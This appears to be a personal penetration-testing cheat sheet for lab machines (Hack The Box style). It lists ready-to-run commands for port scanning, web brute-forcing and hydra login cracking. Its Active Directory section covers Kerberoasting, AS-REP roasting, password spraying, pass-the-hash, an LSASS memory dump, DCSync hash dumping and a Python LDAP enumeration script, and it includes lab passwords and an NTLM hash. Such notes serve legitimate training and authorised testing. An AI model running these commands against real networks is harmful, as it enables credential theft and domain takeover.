# Enumeration
<center><h3>Nmap</h3></center>
`export IP=10.10.10.241`

**TCP  Scans:**

```bash
sudo nmap -v -sSCV -A -T4 -p- 192.168.101.123 -oA output.txt --min-rate=5000
```


**UDP Scans:**

```bash
sudo nmap -sU --top-ports 20 -sV -oA scans/udp 10.10.10.241
```

**Vuln Scan:**

```bash
sudo nmap --script vuln [IP]
```

**Port Knocking:**

```bash
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done
```

**DNS records:**

```bash
host www.megacorpone.com
```

**MX and TXT records:**

```bash
host -t mx www.megacorpone.com
host -t TXT www.megacorpone.com
```

**DNS zone transfer:**

```bash
host -l <domain-name> <dns-name-server>
dnsrecon -d <domain-name> -t axfr
dnsenum <domain-name>
```

**Masscan:**

```bash
sudo masscan -p80 10.11.1.0/24 --rate=2000 -e tun0 --router-ip 10.11.0.1
```


**Pass the nmap XML file to SearchSploit (Prefer to do it manually):**
```bash
searchsploit --nmap nmap.out.xml
```



<center><h3>Web Scanning</h3></center>

**View Page Source Code:**

There might be chances that you discover useful stuff in commands.

**Start the DirSearch:**

```bash
dirsearch.py -u 10.10.10.10:port -E -x 400,500 -r -t 100 -w /directory-list-2.3.txt
```
or *In some server config we need to append / at the end*
```bash
dirsearch.py -u 10.10.10.10:port -E -x 400,500 -r -t 100 -f -w /directory-list-2.3.txt
```

**Start the GoBuster:**

```bash
gobuster dir -u http://laboratory.htb -w /usr/share/directory-list-2.3.txt -s 200,204,301,307,401,403
```
Same with flags:
`-f` -> append / at the end of endpoints

<center><i>If founds nothing so far....</i></center>
Try the basic extensions combination which is best choice: `-x .php, .txt, .sh, .bak, .conf`
If server is windows server: `-x .aspx,.asp,.bak,.jsp`

<center><i>This is all you need to do......</i></center>


>If redirection to a domain is there 
```bash
gobuster vhost -u admirer.htb -w /usr/share/seclists/DNS/namelist.txt
```

-----
**In the End (Agr zyada hi bhasad hai)**
```bash
gobuster dir -u http://10.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt  -x ".zip,.html,.txt,.php,.sh,.cgi,.asp,.aspx,.jsp" -s '200,204,301,302,307,500' -t 100
```

**Nikto Web Scanning:**
```bash
nikto -h
```

**Wordpress scan:**
```bash
wpscan -u <IP>/wp/ -e vp,u

sudo wpscan --url http://backdoor.htb/ -e vp,u --plugins-detection aggressive

# --disable-tls-checks to ignore SSL certificates
wpscan -u https://brainfuck.htb/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
```

- [ ] Check for vulnerable plugin at `/wp-content/plugins/`

**Joomla Scan:**
```bash
joomscan --url http://[IP]/ | tee scans/joomscan.txt
```

**Drupal Scan:**
```bash
/opt/droopescan/droopescan scan drupal -u http://10.10.10.9
```

- [ ] Try `drupaldeggon2 and 3`


<center><h4>Port Checking (Banner Grabbing)</h4></center>

**Netcat Banner Grabbing:**
```bash
nc -v [IP] [port]
```

**Telnet Banner Grabbing:**
```bash
telnet [IP] [port]
```



<center><h4>SSH Tunneling / Pivoting</h4></center>
**Plink local port forwarding:**
```bash
plink -l root -pw pass -R 3389:<localhost>:3389 <remote_host>
```

**SSH local port forwarding:**
```bash
ssh -L 5555:127.0.0.1:7777 jarvis@0.stark.ml -p 22
```

**SSHuttle forwarding:** #todo
```bash
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
```

<center><h4>Carcking</h4></center>
In case if cracking (login) page encoutered then use hydra:

```bash
hydra -l 'admin' -P rockyou.txt 10.10.10.43 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```


<center><h3>Hunting for bugs</h3></center>

- [ ] First of all check the service like SMB, NFS,etc.


---- Shell Stability ----

-   Check out shell spawn article on google.
-   [ssh-stable](app://obsidian.md/ssh-stable) generates a priivate key to keep you login

---- Privilege Escalation for Linux ----

**For the Privilege escalation part:**  
[Linux Priv Checklist](app://obsidian.md/Linux%20Priv%20Checklist)

---- Prvilege Escalation for Windows ----

**For the Privilege escalation part:**




------

--------

<center><h2>AD machines</h2></center>
*This is seperate beacuse of different process of exploitation where generally you find LDAP, kerberos, SMB, RPC, etc services for initial foothold.*

***Need users to go forward that you can get in SMB,SIDs,WebPage,etc***

### enum4linux
```bash
enum4linux -a {IP}
```

### RPC 
[[Services Checklist#Port 135 MSRPC 139 NetBios-SSN 445 Microsoft-DS SMB]]


<center><i>Nothing so far.....</i></center>


***Way to get the usernames out of normal names for AS-REP roasting***
For this you need users and if you have users in form of Names then tool `username-anarchy` help you to make the combinations of this:
```bash
username-anarchy --input-file users > users_combi.txt
```

- [ ] **One more way to enumerate users is by `lookupsid.py`**
```bash
impacket-lookupsid vulnnet-rst.local/anonymous@10.10.38.133 -no-pass
```
- [ ] **One more option with `crackmapexec`**
```bash
crackmapexec smb vulnet.thm -u x3rz -p '' --rid-brute | grep SidTypeUser
```


To check the valid username for final step we can use `kerbrute` to enumerate the names of users out of list we got from anarchy.
```bash
kerbrute_linux_amd64 userenum -d egotistical-bank.local --dc [ip] [user_list] -t 100
# Example
kerbrute userenum -d egotistical-bank.local --dc 10.10.10.175 users_combi -t 100
```

**Kerbroasting:**

![[Pasted image 20220517172639.png]]

***New Kerbroasting method on Host System***

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with [UserAccountControl setting “Do not require Kerberos preauthentication” enabled](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/), it is possible to request and receive a ticket to crack without a valid account on the domain.

- Rubeus.exe
	`Rubeus.exe kerberoast /outfile:hash.txt`
- ps1 Powershell Script
	`Import-Module .\Invoke-Kerbroast.ps1`
	`Invoke-Kerbroast.ps1`

***New Kerbroasting method on Remote System***
- Powershell Empire
	`usermodule credentials/invoke_kerberoast`
	`execute`
- Impacket
- Metasploit
	`powershell_import /root/powershell/Invoke-kerberost.ps1`
	`powershell_execute Invoke-Kerberost`
- Pypykatz from powershell
	`load powershell`
	`powershell_shell`
	`Get-Process Lsass`
	`cd C:\Windows\System32`
	`.\rundll32.exe comsvcs.sll, MiniDump 628 C:\lsass.DMP full`

- ***If you have normal user account and want to get the hash of  other users associated with that account then***
	- Requirement: Normal username and password (***Kerberosting***)
```bash
# List the username associated with normal user account
GetUserSPNs.py -request -dc-ip [IP] [domain]/[normal_user] -save -outfile userlist
impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.50.95
# Example
# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs -save -outfile userlist

```

## References
https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/

<center><h4>Nothing so far?.... Use password spray if you have usernames...</h4></center>

```bash
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist

# Crack password
crackmapexec smb 10.10.10.193 -u users -p wordlist2.txt -d fabricorp.local --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
```


- ***Try AS-REP Roasting*** *where if an account has  access to resources without pre auth*
	- Requirement: Users list, `GetNPUsers.py` from impacket tool

```bash

for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip [dc_ipaddr] [Domain_name]/${user} | grep -v Impacket;done

# Example: 
# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 
#  htb/${user} | grep -v Impacket;done

# Single usage
GetNPUsers.py -dc-ip [IP] domain_name/user

# Example
# python GetNPUsers.py  -dc-ip 10.10.10.175 egotistical-bank.local/fsmith



# /usr/share/doc/python3-impacket/examples/GetNPUsers.py
```


***Got one user > Always Check for remaining users***


- ***Get all the users on AD***
	- Requirement: Username and password of a valid user.
```bash
# Get all users on AD
GetADUsers.py -all -dc-ip [IP] [Domain]/[username]:[Password]

# Example
# GetADUsers.py -all -dc-ip 10.10.10.175 egotistical-bank.local/fsmith:Thestrokes23
```

- [ ] ***Check if the user has DCSync Rights***
	```bash
	# Extract ACLs info
	
	dsacls "DC=htb,DC=local" > dsacls.txt
	
	Get-Content dsacls.txt | findstr "Replicating Directory Changes"
	# or
	Get-Content dsacls.txt | Select-String -Pattern "Replicating Directory Changes"
	```



<center><i>If found hash then....</i></center>

```bash
hashcat -m 18200 hash.txt /rockyou.txt --force
```


<center><b><h3>Cracked password verification</h3></b></center>

- If you found a password then there might be chances that that password is for another user.


We will do that with the help of `crackmapexec`.

Checking of SMB 
```bash
crackmapexec smb 10.10.10.161 -u 'username' -p 'password'

# Pass userlist

crackmapexec smb 10.10.10.169 -u users_list -p 'Welcome123!' --continue-on-success
```

==***Checking username and password in the whole AD network:***==
```bash
crackmapexec smb 10.10.10.0/24 -u "username" -p "password" -d "MARVEL"
```

Checking of Winrm
```bash
crackmapexec winrm 10.10.10.161 -u 'username' -p 'password'
```

<center><i><h3>For remote access</h3></i></center>

```bash

ruby /opt/evil-winrm/wvil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p <password>

# Pass the hash

evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6

or use `psexec.py`

```



***Shell Placement:*** `\appdata\local\temp`



<center>Nothing so far but have <b>credentials</b> of a user with no shell... </center>

We can invoke bloodhound to get the data

```bash
bloodhound-python -c all -u support -p baclfield --dns-tcp -d megabank.local -dc megabank.local -gc megabank.local -ns 10.10.10.192

```
<center><h3>Bloodhound for Privesc</h3></center>

```bash

# This is what you have to write to get the data
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice

# Not an full fleged option
# Python remote data collection 
bloodhound-python -d htb.local -u svc-alfresco@htb.local -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161 -v

# One more 
bloodhound-python -c all -u ryan -p Serv3r4Admin4cc123! --dns-tcp -d megabank.local -dc megabank.local -gc megabank.local -ns 10.10.10.169

```


- [ ] Shortest Paths to Domain Admins from owned Principals
- [ ] Shortest Paths from Domain Users to High Value Targets

If account has `AD replication rights` then it is likely to have higher privileges and you can dump admin hashes from that

<center><h3>LDAP user enumeration</h3></center>

```bash
pip3 install tabulate colored
chmod +x ldap-enum
./ldap-enum <target> <port> <domain>
```

```python
#!/usr/bin/env python3

import ldap3, sys
from colored import fg, attr
from tabulate import tabulate

red, green, white, reset = fg('red'), fg('green'), fg('white'), attr('reset')

if len(sys.argv) < 4:
    print('''
Usage: ldap-enum <target> <port> <domain>

Example: ldap-enum 192.168.1.200 389 dc01.offsec
''')
    exit(0)

target, port, DN = sys.argv[1], int(sys.argv[2]), sys.argv[3].split('.')

try:
    members = []
    interesting = []
    print('\n[+] Connecting to {}{}{}'.format(white, sys.argv[3], reset))
    server = ldap3.Server(target,
                            get_info = ldap3.ALL,
                            port = port,
                            use_ssl = False)
    connection = ldap3.Connection(server)
    connection.bind()
    print('{}[+] Connected!{}'.format(green, reset))
    connection.search(search_base='DC={},DC={}'.format(DN[0], DN[1]),
            search_filter='(&(objectClass=person))',
            search_scope='SUBTREE',
            attributes='*')
    print('[+] Querying LDAP server...')
    print('\n', connection.entries) if connection.entries else print('{}[-] LDAP did not return any results.\n{}'.format(red, reset))
    for person in connection.entries:
        if 'description' in person.entry_attributes and 'password' in str(person.description).lower():
            interesting.append(person)
        members.append([person.cn, person.sAMAccountName,
        person.badPwdCount if 'badPwdCount' in 
        person.entry_attributes else '', person.userPrincipalName 
        if 'userPrincipalName' in person.entry_attributes 
        else '', person.distinguishedName])
    if members:
        print('\n' + green + tabulate(members, headers=['CN', 'sAMAccountName', 'badPwdCount', 'userPrincipalName', 'DN']) + reset)
    if interesting:
        print('{}\n\n[+] Found potentially interesting account(s):{}\n\n{}\n'.format(red, reset, interesting))
except KeyboardInterrupt:
    print('\nExiting...\n')
    exit(0)
```
https://discord.com/channels/780824470113615893/780824472021106700/944257015981699143




#### Privilege Escalation
User > grant DCSync rights > secretdumper (gives hashes) > NTLMrelay or Use Evil-winrm

- Dont forget to use the old way to escalate after testing AD ways


<center><h3>Secret dumper</h3></center> 

This step is after user gets the *DCSync* permissions

```bash
# Remote machine
impacket-secretsdump htb.local/hacker:Password1@10.10.10.161
```

``````
Since svc_loanmgr has AD replication rights let’s try a DCSync attack to make the DC spit out all the hashes, hopefully the Administrator’s ones too
``````

